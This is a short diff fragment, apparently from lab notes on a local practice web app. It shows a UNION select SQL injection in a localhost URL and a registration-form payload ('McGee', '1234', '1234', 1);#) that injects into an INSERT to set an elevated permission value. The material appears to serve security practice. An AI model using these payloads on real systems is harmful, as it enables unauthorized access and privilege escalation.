@@ -297,7 +297,13 @@ http://127.0.0.1:1870/cases/productsCategory.php?category=1%20UNION%20select%20u
 
 
 
+INSERT INTO members (firstname, lastname, username, password, email, permission)
 
+firstname: Hacker
+lastname: 
+*username: McGee', '1234', '1234', 1);#
+*password: 1
+*email: 1
 
 
 
